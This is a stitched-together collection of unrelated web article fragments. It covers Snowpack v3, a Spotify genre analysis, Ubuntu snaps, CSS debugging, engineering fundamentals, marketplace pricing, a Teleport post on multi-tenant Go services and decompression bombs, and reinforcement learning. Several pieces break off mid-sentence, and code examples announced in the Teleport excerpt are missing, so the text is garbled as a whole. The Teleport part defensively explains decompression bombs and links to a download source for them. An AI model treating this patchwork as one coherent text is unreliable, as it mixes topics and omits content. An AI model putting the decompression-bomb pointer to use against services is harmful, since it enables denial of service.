<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every npm package as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline without relying on Skypack besides the first package fetch.</p>
<p>This has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies as pre-build ESM code directly from the Skypack CDN.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever run in the browser sandbox.</li>
<li><strong>Simplicity:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Same Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact imports, resulting in a final build that’s nearly identical.</li>
</ul>
<p>If this all sounds too wild for you, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-npm-imports">Streaming NPM Imports</a> to learn more about how to enable this new behavior in your project today. In a future release, we hope to open this up to custom ESM package sources and other CDNs as well.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-esbuild.png" alt="js api"></p>
<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers and over 300x faster than Parcel (by esbuilds own benchmarks). esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is a post-build optimization, and not the core foundation that everything is built on top of.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but it’s future looks promising. In the meantime, we will also continue to invest in the existing Webpack &amp; Rollup bundler plugins for a long time to come.</p>
<p>To get started, check out the <code>experiments.optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-routes.png" alt="js api"></p>
<h2 id="routing">Routing</h2>
<p>Snowpack’s new <code>experiments.routes</code> configuration lets you define routes that align your dev environment with production. This unlocks some interesting new use-cases, including:</p>
<ul>
<li><strong>API Proxies</strong> - Route all <code>/api/*</code> URLs to another URL or localhost port.</li>
<li><strong>SPA Fallbacks</strong> - Serve an app shell <code>index.html</code> to all requested routes.</li>
<li><strong>Faster Site Loads</strong> - Speed up your site and serve different HTML shell files for each route.</li>
<li><strong>Island Architecture</strong> - Serve HTML that renders individual components on the page, in parallel. (Made popular by <a href="https://twitter.com/_developit">Jason Miller</a> in <a href="https://jasonformat.com/islands-architecture/">this blog post</a>).</li>
<li><strong>Mimic Vercel/Netlify</strong> - Re-create your Vercel or Netlify routes in development. Or, create a Snowpack plugin to automatically generate these routes from your <code>vercel.json</code> or <code>_redirects</code> file at startup.</li>
</ul>
<p>While API proxying and SPA fallbacks have already been supported in Snowpack for a while now, this brings them all together into a single, expressive new API.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p>The Svelte team recently made news with <a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a>: An official, zero-effort SSR app framework for Svelte apps. SvelteKit is powered internally by Snowpack, using our brand-new JavaScript API to manage your build pipeline and build files on-demand. Snowpack speeds up development and helps to cut SvelteKit’s startup time to near-zero.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack. Or, read through our new guide on <a href="https://www.snowpack.dev/guides/server-side-render">Server-Side Rendering</a> to get started with a custom SSR integration for production.</p>
<h2 id="installation">Installation</h2>
<p>You can install the Snowpack v3.0 release candidate today by running:</p>
<pre><code>npm install snowpack@next
</code></pre>
<p>Since all v3.0 features already exist in Snowpack today, our existing documentation site applies to both v2 &amp; v3. At this point only very old, undocumented, legacy behavior has been removed from the <code>next</code> v3.0 branch.</p>
<p>Features under the <code>experiments</code> flag may continue to change as we get closer to the official release date. By the end of the year, you can expect that these features will move out from behind the <code>experiments</code> flag and into top-level config objects in the <code>next</code> v3.0 branch.</p>

December 3, 2020 | http://www.ph-uhl.com/0009-Music-Genres/ | <a href="https://web.archive.org/web/*/http://www.ph-uhl.com/0009-Music-Genres/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

            <p>
              I am sure, you have been asked "Hey, what do you listen
              to?" a million times. Some people can easily answer that
              question. I never could. Until now.

              Thanks to the new digital data collecting behemoths that
              record our every moves, I can tell you exactly, what
              music I listen to! I am a Spotify user and they told me at
              the end of 2019:
            </p>

            <p><img src="http://www.ph-uhl.com/0009-Music-Genres/myGenres1.svg" alt="A depiction of the genres, I listen to most, as
                        compiled by Spotify:
                        Electro House, Dance Pop, Rock, Hip hop, Big beat."></p><p>
              When I saw this, I was thrilled. Finally an answer,
              depicted in a nice diagram. A hard question, broken down
              to just five genres, even showing me, how much I like
              each of them. Just, that this picture does not. My
              thrill puffed away, as soon as I saw a few of my
              friends' diagrams. They looked exactly the same. Sure,
              the genres were different, but the graphic shows the
              same distribution, the same five bars with the same
              heights. Spotify cut some corners and did not use their
              vast amount of data to satisfy my desire for insight.
            </p>

            <p>
              That did not sit right with me, so I decided to take
              upon that issue myself and I came up with my own graphic:
            </p>

            <p><img src="http://www.ph-uhl.com/0009-Music-Genres/myGenres2.svg" alt="A depiction of the genres, I listen to most, as
                        compiled by me:
                        Electronic, Big beat, Pop, Downtempo, Dance pop."></p><p>
              When looking at this graph, it becomes clear, why
              Spotify went with their designers instead of their data
              analysts on displaying this graph. But still.
            </p>

            <p>
              While this fun little graph, now upholds to my pedantic
              standards, it does not really answer all the questions I
              have. That's why I went totally overboard and
              created a four-dimensional space of all the genres I
              listen to (at the bottom of this page). But where did I
              get the data from, and <strong>how can you create your own
              multi-dimensional
              genre map?</strong>

              When the European Union slowly realized that it is loosing
              the race in internet behemoism, they decided, instead
              they could try to stop the user data export to the United
              States. This was attempted by introducing a new legislation,
              the well known GDPR ("General Data Protection
              Regulation"). It was introduced on May the 25th, 2018
              and is one of multiple legislations that aims at
              protecting consumers online. And the best part: With
              virtually no international web-based giants, the
              introduction of GDPR would
              not even hurt the big European web companies (because there
              are none). On thing, GDPR does: It makes it mandatory for companies to provide
              their users with the ability to receive all the personal
              user generated data on request. In the case of Spotify
              you can just download all the songs you liked as a handy
              machine-readable file. That is what I did. And I analyzed it.
            </p>
            <p>
              For plotting my genres onto a multi-dimensional
              space, Spotify plays a second role, as well:
              In 2014 Spotify bought "The Echo Nest", a company,
              focused on  music analysis.
              Glenn McDonald, an employee and data engineer of "The
              Echo Nest", made an affort to analyze into what genres the
              music on Spotify can be devided and how these
              genres relate to each other. If you haven't seen it yet,
              you should totaly check out Glenn's site
              <a href="http://everynoise.com/">everynoise.com</a>.
              Over there,  all the genres that Glenn's analysis
              produced are plotted in relation to each other, with
              bands and songs of these genres, available with just a
              few clicks. Even if you are not as much a
              data-visualization-fetishist as I am, it is worth a
              look. Not only does Glenn track over 3.000 genres, he
              also provides many playlists for all these genres and a
              lot more. Go. Check. It. Out. Then come back here... ;)
              If you have, you will notice a slight resemblance with
              what you see on the bottom of this website, but more on
              that in a sec.
            </p>
            <p>
              What has Glenn's effort of tracking genres to do with
              us?  After scraping the genres, I can put them into
              relation with the music of my own liking by just show
              the genres, I listen music from. And these are displayed
              in different sizes, based on how many songs in that
              particular genre I have liked on Spotify.

            </p>
            <h2>Surprizing Insights: I listen to "lgbtq+ hip hop"
              <small>Wait, thats a genre?</small>
            </h2>
            <p>
              Some insights are in sight. The
              data is presented in the same way as it is on Every
              Noise. About the orientation from left to right and top
              to bottom I will let Every Noise speak for them selfs:
            </p>

              "The calibration is fuzzy, but in general down
              is more organic, up is more mechanical and electric;
              left is denser and more atmospheric, right is spikier
              and bouncier".

              Turns out, I like quite a broad spectrum of music but I
              do have a focus on the electronic, hip-hop, rapish,
              poppy, rocky music. Below are my top 15 genres with the
              amount of songs:

              My music collection does offer some weird outliers. I
              was amused to see that I apparently am listening
              to "lgbtq+ hip hop". Apparently, Azealia Banks is responsible
              for this lable. Yes, that rough racism tweeting music marvel
              who raps about loving white dick
              (click to play: <span nolink="true" onclick="tryToPlay(this, 'Azealia Banks', ['Liquorice'])">Liquorice</span>) or here iciness
              (<span nolink="true" onclick="tryToPlay(this, 'Azealia Banks', ['Ice princess'])">Ice princess</span>).
            </p>
            <p>
              It also becomes apparent, how international music can be
              nowadays. I listen to Slovenian electronic, Brazilian
              electronica, Swedish (synth | synthpop | electropop |
              pop | indie pop), French hip hop, Australian, Icelandic, Mexican, South
              African, and Austrian pop, South African alternative,
              Cape Town indie, Russian (rock | trap | hip hop | pop),
              British (insert long list of genres here), German (metal
              | pop | punk | rock | hip hop | techno | baroque), and
              many US American genres. The list
              goes on.
            </p>
            <p>
              Now, let's take a look at the genre space! (Depending on your
            screen size, some scrolling might be required.)

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-377">

<p>On Ubuntu Linux <a href="https://snapcraft.io/about">snaps</a> are app packages for desktop, cloud and IoT that are easy to install, secure, cross‐platform and dependency‐free and their main selling point is security and <a href="https://snapcraft.io/docs/snap-confinement">confinement</a>. </p>



<p>Traditionally packaging for Ubuntu is via .deb packages but much as I try, I never find it straight forward to create or maintain deb packages and I find creating snap packages much easier. </p>



<p>One use case of snaps which doesn’t get talked about much is using snaps to bring no longer supported software back to life. For example, in Ubuntu 20.10 (Groovy Gorilla) which is soon to be released there is no longer support for python2 by default and many other packages have been deprecated too in favour of newer and better replacements. This does mean though that packages which depended on these deprecated packages are not installable and will not run. Snaps can fix this.</p>



<p>Snaps have the concept of <a href="https://snapcraft.io/docs/base-snaps">Base snaps</a> where is snap can specify a runtime which is based on a previous release of Ubuntu.</p>



<ul><li>core20 base is based on Ubuntu 20.04</li><li>core18 base is based on Ubuntu 18.04</li><li>core base is based on Ubuntu 16.04</li></ul>



<p>As such you can create snap packages of any software that is installable on any of these previous Ubuntu releases and run that snap on newer releases of Ubuntu.</p>



<p>My workflow relies on many applications, most of which are still installable on Ubuntu 20.10 but I have found three that are not.</p>



<ul><li><a href="http://doc.bazaar.canonical.com/explorer/en/">bzr-explorer</a></li><li><a href="https://github.com/kozec/syncthing-gtk">syncthing-gtk</a></li><li><a href="https://kitematic.com/">kitematic</a></li></ul>



<p>To unblock my workflow I created snaps of these @ <a href="https://github.com/philroche/bzr-explorer-snap">https://github.com/philroche/bzr-explorer-snap</a>, <a href="https://github.com/philroche/syncthing-gtk-snap">https://github.com/philroche/syncthing-gtk-snap</a> and <a href="https://github.com/philroche/kitematic-snap">https://github.com/philroche/kitematic-snap</a> which are all snaps using the core18 and core20 base snaps.</p>



<p>Note that these snaps are classic snaps and are not confined as is <a href="https://snapcraft.io/docs/snap-confinement">recommended for most snaps</a> but it does unblock my workflow and is a neat use of snap packaging. </p>



<p>If you need help packaging a deprecated deb package as a snap please reach out. </p>

Aren’t cheat sheets supposed to be an easy way to fast-track learning CSS? And doesn’t learning CSS help in debugging it?</p><p>Funnily enough, the answer to the latter is yes. As we will soon see, the problem is with the assumption held within the former. </p><p>While a greater understanding of CSS is indeed key to making debugging it easier, the method of gaining that understanding is certainly not in cheat sheets. In fact, the use of cheat sheets lives on the opposite end of the spectrum, with regards to what you should be doing when wanting to truly understand CSS.</p><p>What cheat sheets focus on is the memorization of specific pieces of information. Often in isolation. </p><p>Understanding on the other hand is about gaining a holistic, <em>connected</em> view. One that gives you the ability to see each part of what you’re learning within the context of everything else that you’ve learned.</p><p><em><strong>And this is key to debugging effectively.</strong></em></p><p>As any experienced programmer has probably found, the source of a bug is usually not at the location of the bug itself, but somewhere else in the system.

This is because developers generally have a deeper understanding of the languages that they are using because the languages are more logical.</p><p>CSS is a bit less so. </p><p>While with development, zooming-in can often be a benefit, with CSS, a more visual, right-brained sort of a language, zooming out and seeing the big picture, is a lot more important.</p><p>Because of this inherent difference in CSS as compared to more conventional programming based languages, developers tend to underestimate it, and therefore tend to not learn it in such a way that they gain a true, networked ‘understanding’ of it on an intuitive level that they should. </p><p>This is what makes debugging CSS so difficult for most developers.</p><p>Layouts, and creating them, are not understood as being logical in the same way. And because of this developers both underestimate and fail to truly understand CSS. This makes it hard to see the complete context of the problems that come up when they’re writing CSS, and therefore makes CSS issues harder to debug.</p><p>So how can this be solved?</p><p><strong>There are two approaches that are particularly effective:</strong></p><p>- By <a target="_blank" title="https://planflow.dev/blog/how-to-get-better-at-css/" href="https://planflow.dev/blog/how-to-get-better-at-css/">re-framing CSS</a>, coming at it from the more logical perspective.</p><p>- By deepening knowledge of CSS (the language, and how it works) in order to gain a more intuitive feel for it, and how it is used to construct layouts.</p><p>Combining these two steps will allow you to SEE the big picture when writing CSS.

<p>The fundamentals transcend the particular technology choices and the current trends, underlying most what a practitioner does. Investing in a deep mastery of the fundamentals always pays off by allowing one to really understand other adjacent concepts in terms of its more essential pieces. Unlike someone who is supposed to follow pre-determined procedures and apply handed-down knowledge, an engineer should be able to devise procedures and create novel knowledge from first principles.</p>

<p><strong>Computer Programming</strong> – Being able to fluently express ideas in a high-level imperative language such as <em>Python</em>, <em>Java</em>, <em>JavaScript</em> or <em>C</em>. For at least one of those languages, fully understand variables, data types, control flow, arrays, functions (or methods), pointers, pass-by-value vs pass-by-reference, scoping, structures (or objects and classes), console and file input/output. Understanding the binary numerical system and IEEE floating point representation. Understanding ASCII and Unicode character representations.</p>

<p><strong>Computer Algorithms</strong> – Knowing how to evaluate the time and space complexity of classic and ad-hoc algorithms. Knowing the basics about sorting algorithms and string matching. Being able to devise and implement ad-hoc algorithms with efficient time complexity. Being able to devise and implement ad-hoc recurrent algorithms.</p>

<p><strong>Data Structures</strong> – Knowing the trade offs and when to use stacks, queues, priority queues (heaps), hash tables (dictionaries or maps) and dynamically-sized arrays. Knowledge about graphs and trees. Knowledge about fundamental graph algorithms: breadth-first search, depth-first search and topological sort.</p>

<p><strong>Version Control Systems</strong> – Understanding and being able to use <em>git</em> to version control source-code, submit pull requests, perform and undergo code reviews.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type-cleanup="true">

<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/62134f7d-7b7f-a46f-4850-8b0860c5df69.jpg"></p>
<p>A marketplace consists of supply - provided by sellers and demand - created by buyers. </p>
<p>A marketplace matches buyers with sellers. </p>
<p>We consider real or virtual goods (items). We do not consider here service marketplaces such as Uber.</p>
<p>A fundamental function of the marketplace is the pricing of items transacted through the market. </p>
<p>What mechanism can the marketplace use to set the price of the items sold through the market?</p>

<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/48333b15-35d8-e01d-acdb-5a634453e637.jpg"></p>
<p>There are three basic models. </p>
<h2>Fixed Price</h2>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/32f6be8d-4fa4-5247-080f-726bea6e2e64.jpg"></p>
<p>The traditional model of pricing is the fixed price per item. A seller sets a price. A buyer either buys the thing at the set price and or not.</p>
<h2>Auction</h2>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/5f5f27ce-10be-f5fe-1048-dc7e37d11e41.jpg"></p>
<p>An old but less used model for pricing is to carry an auction for an item. In an auction, buyers place bids with an increasing price for an item until one buyer wins. Usually, an auction runs for a predetermined duration. </p>
<p>In economics, this type of auction is called an English auction. And it is the one common in marketplaces. But note that other types of auctions are possible. For example, one can consider the Dutch auction. An object's price in a Dutch auction goes down in fixed increments over time until it receives a bid at the current price.</p>
<h2>Exchange</h2>
<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/e3b672da-d668-3c44-cf88-4962fded78df.jpg"></p>
<p>A rising pricing model in marketplaces for collectibles or sneakers is that of an exchange. So these items are scarce. However, at any given moment, a certain quantity of the object is available at the marketplace. </p>
<p>An exchange operates by setting an item's price as a balance of the stream of asks and bids for the thing. A seller's proposal specifies the requested price per unit of the item and the number of units for sale. Such a proposal is called an ask. The buyer's suggestion determines the suggested price at which the buyer is willing to buy a unit of the item and the number of units to buy. Such a proposal is called a bid. </p>
<p>The marketplace then matches the asks and bids in terms of prices and quantities. A transaction occurs between a seller and a buyer. In a transaction, some or all of the amount of the respective ask and bid changes ownership. </p>
<p>The marketplace announces an item's price after each transaction, as the price at which the transaction occurred. </p>

<p>Like in many things in business and life, the answer is <strong>it depends on</strong>.</p>
<p>A fixed price for items is the most straightforward price mechanism. But setting a fixed price requires the supply side to have a clear idea of the price of an object. When the supply side is a store selling merchandise, it will have such an evaluation based on its cost. However, as marketplaces become more populated by individuals selling stuff they own, such as furniture, this no longer holds.</p>
<p>Auctions are better for a seller when you cannot know how much an item can fetch. The increasing rise in second-hand, recycled, and sustainable E-Commerce will make this the more frequent case in 2021 and onwards. </p>
<p>For an exchange pricing mechanism to work, one needs a steady stream of asks and bids for the same item. Such a stream will be available for sneakers, but not for most objects that people wish to sell from home.</p>

<p><img src="https://cdn-images.postach.io/09bd0397-0710-42f1-8919-9b1de0319ead/6ae384f7-deb0-8c12-ac74-cbbad4360132/3834a5e1-7a8d-a875-80ee-5af92f9f5953.jpg"></p>
<p>In the future, into 2021, we believe the auction mechanism will become much more dominant as a price-setting mechanism in marketplaces.</p>

<![CDATA[The Pitfalls of Language Runtimes and Multi-Tenant Services]]>

December 3, 2020 | https://goteleport.com/blog/multi-tenant-pitfalls/ | <a href="https://web.archive.org/web/*/https://goteleport.com/blog/multi-tenant-pitfalls/">archive.org</a>

<p>Modern languages like Python, NodeJS, and Go make it easy to handle
concurrent requests for multiple customers at the same time by using threads or goroutines.</p>

<p>Such services seem very cost effective because one process can handle hundreds or thousands
of tenants. However, this efficiency comes at a hidden, steep price. When language runtime
scheduling breaks down, one tenant can cause an outage for everyone.</p>

<h2 id="concurrency-made-simple">Concurrency made simple</h2>

<p>Go makes it trivial to handle concurrency.</p>

<p>Here is an example from <a href="https://tour.golang.org/concurrency/1">A Tour Of Go</a> that
launches two goroutines that work independently of each other:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"fmt"</span>
	<span>"time"</span>
)

<span>func</span> <span>say</span>(<span>s</span> <span>string</span>) {
	<span>for</span> <span>i</span> <span>:=</span> <span>0</span>; <span>i</span> &lt; <span>5</span>; <span>i</span><span>++</span> {
		<span>time</span>.<span>Sleep</span>(<span>100</span> <span>*</span> <span>time</span>.<span>Millisecond</span>)
		<span>fmt</span>.<span>Println</span>(<span>s</span>)
	}
}

<span>func</span> <span>main</span>() {
	<span>go</span> <span>say</span>(<span>"world"</span>)
	<span>say</span>(<span>"hello"</span>)
}
</code></pre></div>
<p>The Go runtime makes sure that each goroutine gets its fair share of CPU and memory.
It gives the impression that both run in parallel:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS sets system threads to 1</span>
<span># This sets up the go language runtime to use one system thread across</span>
<span># all goroutines. Removing this setting will introduce some parallelism,</span>
<span># but will not solve the problems described in this article.</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run main.go
world
hello
hello
world
...</code></pre></div>
<h2 id="language-runtimes-and-multi-tenancy">Language Runtimes and Multi-Tenancy</h2>

<p>Let’s implement a sample Go SaaS that fetches the contents of a URL
for multiple tenants in parallel:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"net/http"</span>
    <span>"sync"</span>
)

<span>// fetch in our example performs some SaaS work for a tenant,
</span><span>// in this case it gets the URL contents from the internet
</span><span></span><span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>url</span> <span>string</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>// Don't ignore errors in real code, folks, and close the response body
</span><span></span>    <span>re</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
        <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) error -&gt; -&gt;  %v\n"</span>, <span>tenant</span>, <span>err</span>)
        <span>return</span>
    }
    <span>defer</span> <span>re</span>.<span>Body</span>.<span>Close</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v\n"</span>, <span>tenant</span>, <span>re</span>.<span>Status</span>)
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>url</span> <span>:=</span> <span>"http://www.golang.org/"</span>
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>3</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>url</span>)
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>My computer runs the program in no time:</p>
<div><pre><code data-lang="bash">$ go run simple/main.go 
Tenant<span>(</span>2<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>1<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>0<span>)</span> -&gt; <span>200</span> OK</code></pre></div>
<p>We can imagine that the Go runtime executes the program in the following order:</p>
<div><pre><code data-lang="go"><span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>0</span>, <span>"http://golang.org"</span>)
<span>handle0</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle0</span>, <span>goroutine0</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine0</span>)

<span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>1</span>, <span>"http://golang.org"</span>)
<span>handle1</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle1</span>, <span>goroutine1</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine1</span>)
<span>...</span>
<span>// main program waits until any function returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>...</span> 
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
<span>// main program waits until any other handle returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
</code></pre></div>
<p>This parallelism and blocking call is an illusion created by a combination of the use of the asynchronous
<a href="https://kovyrin.net/2006/04/13/epoll-asynchronous-network-programming/">epoll</a> Linux function
and Go’s built in runtime scheduler. <code>epoll</code> can efficiently handle thousands of network sockets at once.</p>

<p>The Go runtime activates a smart scheduler to handle <code>go</code> statements - goroutines.
It makes sure that every goroutine gets its share of CPU time and suspends
execution when the function is waiting on network or file input/output.
It’s not unusual to have tens of thousands of goroutines in the system
and see the Go runtime handle the requests well.</p>

<p>If you are interested in a more detailed intro to the Go scheduler, take a look at this article
from <a href="https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html">Ardan Labs</a>.</p>

<p>This makes Go a great language for handling concurrent network requests
that constitute the bulk of an average software as a service program that reads and writes to a database
or an external service.</p>

<h2 id="when-fair-scheduling-breaks-down">When fair scheduling breaks down</h2>

<p>Language runtimes do not have full control and visibility into
the resource allocation that is done by the Linux kernel.</p>

<p>This is where the multi-tenancy service promise of fair scheduling breaks down.</p>

<p>Take a look at this number-crunching service that computes factorials on demand:</p>

<p>Because of the inefficient factorial implementation that took a lot of iterations
and number crunching, tenant 0 consumed all the CPU time and degraded performance for the others.</p>

<p>We can fix the factorial function and add code that limits the possible input numbers.
However, our service has just suffered an outage due to a bug in the code for all our customers,
<a href="https://goteleport.com/resources/videos/workflow-access-pageduty-slack/">PagerDuty</a> is ringing and we are not sleeping again.</p>

<h2 id="a-real-world-example">A real-world example</h2>

<p>I made up our factorial example, but let’s create a real world one using
decompression bombs.</p>

<p>Decompression bombs are specially crafted archives that are small, but expand
into files ranging from tens to thousands of times their size.</p>

<p>They are specifically designed to take down your service. Anyone can download
one <a href="https://bomb.codes/bombs">from the internet</a>.</p>

<p>Some archives use simple techniques like compressing very large files
filled with zeroes. They take advantage of the fact that compression algorithms
represent a huge file with zeroes with a version of <code>repeat billion zeroes here</code>.</p>

<p>More <a href="https://www.usenix.org/system/files/woot19-paper_fifield_0.pdf">sophisticated approaches</a>
explore compression techniques in depth and craft evil files
that can explode to petabytes of disk space. The danger is real and lots of programs are
vulnerable on the internet right now.</p>

<p>Let’s explore the effect of such archive on a multi-tenant service.
Our new service unpacks the archive and counts the number of words in a file:</p>

<p>Reinforcement learning is a field of Artificial Intelligence in which you build an intelligent system that learns from its environment through interaction and evaluates what it learns in real-time.&nbsp;</p>



<p>A good example of this is self-driving cars, or when DeepMind built what we know today as AlphaGo, AlphaStar, and AlphaZero.&nbsp;</p>



<p>AlphaZero is a program built to master the games of chess, shogi and go (AlphaGo is the first program that beat a human Go master). AlphaStar plays the video game StarCraft II.</p>



<p>In this article, we’ll compare model-free vs model-based reinforcement learning. Along the way, we will explore:</p>

<h2>Fundamental concepts of Reinforcement Learning</h2>



<p>Any reinforcement learning problem includes the following elements:</p>



<ol><li><strong>Agent</strong> – the program controlling the object of concern (for instance, a robot).</li><li><strong>Environment</strong> – this defines the outside world programmatically. Everything the agent(s) interacts with is part of the environment. It’s built for the agent to make it seem like a real-world case. It’s needed to prove the performance of an agent, meaning if it will do well once implemented in a real world application.</li><li><strong>Rewards</strong> – this gives us a score of how the algorithm performs with respect to the environment. It’s represented as 1 or 0. ‘1’ means that the policy network made the right move, ‘0’ means wrong move. In other words, rewards represent gains and losses.</li><li><strong>Policy</strong> – the algorithm used by the agent to decide its actions. This is the part that can be model-based or model-free.</li></ol>



<p>Every problem that needs an RL solution starts with simulating an environment for the agent. Next, you build a policy network that guides the actions of the agent. The agent can then evaluate the policy if its corresponding action resulted in a gain or a loss.</p>



<p>The policy is our main discussion point for this article. Policy can be model-based or model-free. When building, our concern is how to optimize the policy network via policy gradient (PG).&nbsp;</p>



<p>PG algorithms directly try to optimize the policy to increase rewards. To understand these algorithms, we must take a look at Markov decision processes (MDP).</p>






<h3><strong>Markov decision processes / Q-Value / Q-Learning / Deep Q Network</strong></h3>



<p>MDP is a process with a fixed number of states, and it randomly evolves from one state to another at each step. The probability for it to evolve from state A to state B is fixed.</p>



<p>A lot of Reinforcement Learning problems with discrete actions are modeled as <strong>Markov decision processes</strong>, with the agent having no initial clue on the next transition state. The agent also has no idea on the rewarding principle, so it has to explore all possible states to begin to decode how to adjust to a perfect rewarding system. This will lead us to what we call Q Learning.</p>



<p>The <strong>Q-Learning algorithm</strong> is adapted from the <strong>Q-Value</strong> Iteration algorithm, in a situation where the agent has no prior knowledge of preferred states and rewarding principles. Q-Values can be defined as an optimal estimate of a state-action value in an MDP.&nbsp;</p>



<p>It is often said that Q-Learning doesn’t scale well to large (or even medium) MDPs with many states and actions. The solution is to approximate the Q-Value of any state-action pair (s,a). This is called Approximate Q-Learning.&nbsp;</p>



<p>DeepMind proposed the use of deep neural networks, which work much better, especially for complex problems – without the use of any feature engineering. A deep neural network used to estimate Q-Values is called a <strong>deep Q-network (DQN).</strong> Using DQN for approximated Q-learning is called Deep Q-Learning.</p>






<h2>Difference Between Model-Based and Model-Free Reinforcement Learning</h2>



